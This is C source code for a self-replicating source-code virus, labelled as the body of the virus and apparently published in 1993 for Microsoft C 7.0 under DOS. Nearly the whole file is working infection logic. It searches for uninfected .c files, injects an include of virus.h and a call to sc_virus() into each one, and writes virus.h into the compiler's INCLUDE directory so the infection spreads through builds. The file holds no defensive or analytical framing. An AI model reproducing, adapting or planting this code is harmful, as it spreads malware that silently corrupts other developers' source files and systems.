/*Microsoft C 7.0-compatible source code virus
  This file contains the actual body of the virus.

  This code is (C) 1993 by American Eagle Publications, Inc.
                           P.O. Box 41401
                           Tucson, AZ 85717

  ALL RIGHTS RESERVED. YOU MAY NOT COPY OR DISTRIBUTE THIS CODE IN ANY FORM,
  SOURCE OR EXECUTABLE, WITHOUT PRIOR WRITTEN PERMISSION FROM THE PUBLISHER!!!
*/

#ifndef SCVIRUS
#define SCVIRUS

#include <stdio.h>
#include <dos.h>

#define TRUE 1
#define FALSE 0

/* The following array is initialized by the CONSTANT program */
static char virush[]={0};

/******************************************************************************/
/* This function determines whether it is OK to attach the virus to a given
   file, as passed to the procedure in its parameter. If OK, it returns TRUE.
   The only condition is whether or not the file has already been infected.
   This routine determines whether the file has been infected by searching
   the file for "#include <virus.h>", the virus procedure. If found, it assumes
   the program is infected. */

int ok_to_attach(char *fn)
{
  FILE *host_file;
  int j;
  char txtline[255];

  if ((host_file=fopen(fn,"r"))==NULL) return FALSE;      /* open the file */
  do
    {                                                    /* scan the file */
      j=0; txtline[j]=0;
      while ((!feof(host_file))&&((j==0)||(txtline[j-1]!=0x0A)))
        {fread(&txtline[j],1,1,host_file); j++;}
      txtline[--j]=0;
      if (strcmp("#include <virus.h>",txtline)==0)       /* found virus.h ref */
        {
          fclose(host_file);                             /* so don't reinfect */
          return FALSE;
        }
    }
  while (!feof(host_file));
  close(host_file);                                      /* virus.h not found */
  return TRUE;                                           /* so ok to infect */
}

/******************************************************************************/
/* This function searches the current directory to find a C file that
   has not been infected yet. It calls the function ok_to_attach in order
   to determine whether or not a given file has already been infected. It
   returns TRUE if it successfully found a file, and FALSE if it did not.
   If it found a file, it returns the name in fn.  */

int find_c_file(char *fn)
{
  struct find_t c_file;
  int ck;

  ck=_dos_findfirst(fn,_A_NORMAL,&c_file);       /* standard DOS file search */
  while ((ck==0) && (ok_to_attach(c_file.name)==FALSE))
    ck=_dos_findnext(&c_file);                   /* keep looking */
  if (ck==0)                                     /* not at the end of search */
    {                                            /* so we found a file */
      strcpy(fn,c_file.name);
      return TRUE;
    }
  else return FALSE;                             /* else nothing found */
}

/******************************************************************************/
/* This is the routine which actually attaches the virus to a given file.
   To attach the virus to a new file, it must take two steps: (1) It must
   put a "#include <virus.h>" statement in the file. This is placed on the
   first line that is not a comment. (2) It must put a call to the sc_virus
   routine in the last function in the source file. This requires two passes
   on the file.
*/

void append_virus(char *fn)
{
  FILE *f,*ft;
  char l[255],p[255];
  int i,j,k,vh,cf1,cf2,lbdl,lct;

  cf1=cf2=FALSE;              /* comment flag 1 or 2 TRUE if inside a comment */
  lbdl=0;                     /* last line where bracket depth > 0 */
  lct=0;                      /* line count */
  vh=FALSE;                   /* vh TRUE if virus.h include statement written */
  if ((f=fopen(fn,"rw"))==NULL) return;
  if ((ft=fopen("temp.ccc","a"))==NULL) return;
  do
    {
      j=0; l[j]=0;
      while ((!feof(f)) && ((j==0)||(l[j-1]!=0x0A)))   /* read a line of text */
        {fread(&l[j],1,1,f); j++;}
      l[j]=0;
      lct++;                                          /* increment line count */
      cf1=FALSE;                                 /* flag for // style comment */
      for (i=0;l[i]!=0;i++)
        {
          if ((l[i]=='/')&&(l[i+1]=='/')) cf1=TRUE;      /* set comment flags */
          if ((l[i]=='/')&&(l[i+1]=='*')) cf2=TRUE;      /* before searching */
          if ((l[i]=='*')&&(l[i+1]=='/')) cf2=FALSE;     /* for a bracket */
          if ((l[i]=='}')&&((cf1|cf2)==FALSE)) lbdl=lct; /* update lbdl */
        }
      if ((strncmp(l,"/*",2)!=0)&&(strncmp(l,"//",2)!=0)&&(vh==FALSE))
        {
          strcpy(p,"#include <virus.h>\n");            /* put include virus.h */
          fwrite(&p[0],strlen(p),1,ft);            /* on first line that isnt */
          vh=TRUE;                                  /* a comment, update flag */
          lct++;                                            /* and line count */
        }
      for (i=0;l[i]!=0;i++) fwrite(&l[i],1,1,ft); /*write line of text to file*/
    }
  while (!feof(f));                               /* all done with first pass */
  fclose(f);
  fclose(ft);
  if ((ft=fopen("temp.ccc","r"))==NULL) return; /*2nd pass, reverse file names*/
  if ((f=fopen(fn,"w"))==NULL) return;
  lct=0;
  cf2=FALSE;
  do
    {
      j=0; l[j]=0;
      while ((!feof(ft)) && ((j==0)||(l[j-1]!=0x0A)))    /* read line of text */
        {fread(&l[j],1,1,ft); j++;}
      l[j]=0;
      lct++;
      for (i=0;l[i]!=0;i++)
        {
          if ((l[i]=='/')&&(l[i+1]=='*')) cf2=TRUE;    /* update comment flag */
          if ((l[i]=='*')&&(l[i+1]=='/')) cf2=FALSE;
        }
      if (lct==lbdl)                             /* insert call to sc_virus() */
        {
          k=strlen(l);                                  /* ignore // comments */
          for (i=0;i<strlen(l);i++) if ((l[i]=='/')&&(l[i+1]=='/')) k=i;
          i=k;
          while ((i>0)&&((l[i]!='}')||(cf2==TRUE)))
            {
              i--;                                     /* decrement i and track*/
              if ((l[i]=='/')&&(l[i-1]=='*')) cf2=TRUE; /*comment flag properly*/
              if ((l[i]=='*')&&(l[i-1]=='/')) cf2=FALSE;
            }
          if (l[i]=='}')       /* ok, legitimate last bracket, put call in now*/
            {                                         /* by inserting it in l */
              for (j=strlen(l);j>=i;j--) l[j+11]=l[j];                /* at i */
              strncpy(&l[i],"sc_virus();",11);
            }
        }
      for (i=0;l[i]!=0;i++) fwrite(&l[i],1,1,f);  /* write text l to the file */
    }
  while (!feof(ft));
  fclose(f);                    /* second pass done */
  fclose(ft);
  remove("temp.ccc");           /* get rid of temp file */
}

/******************************************************************************/
/* This routine searches for the virus.h file in the first include directory.
   It returns TRUE if it finds the file.                                      */

int find_virush(char *fn)
{
  FILE *f;
  int i;

  strcpy(fn,getenv("INCLUDE"));
  for (i=0;fn[i]!=0;i++)                   /* truncate include if it has */
    if (fn[i]==';') fn[i]=0;               /* multiple directories */
  if (fn[0]!=0) strcat(fn,"\\VIRUS.H");    /*full path of virus.h is in fn now*/
  else strcpy(fn,"VIRUS.H");               /* if no include, use current*/
  f=fopen(fn,"r");                         /* try to open the file */
  if (f==NULL) return FALSE;               /* can't, it doesn't exist */
  fclose(f);                               /* else just close it and exit */
  return TRUE;
}

/******************************************************************************/
/* This routine writes the virus.h file in the include directory. It must read
   through the virush constant twice, once transcribing it literally to make
   the ascii text of the virus.h file, and once transcribing it as a binary
   array to make the virush constant, which is contained in the virus.h file */

void write_virush(char *fn)
{
  int j,k,l,cc;
  char v[255];
  FILE *f;

  if ((f=fopen(fn,"a"))==NULL) return;
  cc=j=k=0;
  while (virush[j]) fwrite(&virush[j++],1,1,f); /*write up to first 0 in const*/
  while (virush[k]||(k==j))                  /* write constant in binary form */
    {
      itoa((int)virush[k],v,10);             /* convert binary char to ascii # */
      l=0;
      while (v[l]) fwrite(&v[l++],1,1,f);    /* write it to the file */
      k++;
      cc++;
      if (cc>20)                             /* put only 20 bytes per line */
        {
          strcpy(v,",\n                      ");
          fwrite(&v[0],strlen(v),1,f);
          cc=0;
        }
      else
        {
          v[0]=',';
          fwrite(&v[0],1,1,f);
        }
    }
  strcpy(v,"0};");                           /* end of the constant */
  fwrite(&v[0],3,1,f);
  j++;
  while (virush[j]) fwrite(&virush[j++],1,1,f);/*write everything after constant*/
  fclose(f);                                 /* all done */
}

/******************************************************************************/
/* This is the actual viral procedure. It does two things: (1) it looks for
   the file VIRUS.H, and creates it if it is not there. (2) It looks for an
   infectable C file and infects it if it finds one. */

void sc_virus()
{
  char fn[64];

  strcpy(fn,getenv("INCLUDE"));    /* make sure there is an include directory */
  if (fn[0])
    {
      if (!find_virush(fn)) write_virush(fn);     /* create virus.h if needed */
      strcpy(fn,"*.c");
      if (find_c_file(fn)) append_virus(fn);      /* infect a file */
    }
}

#endif
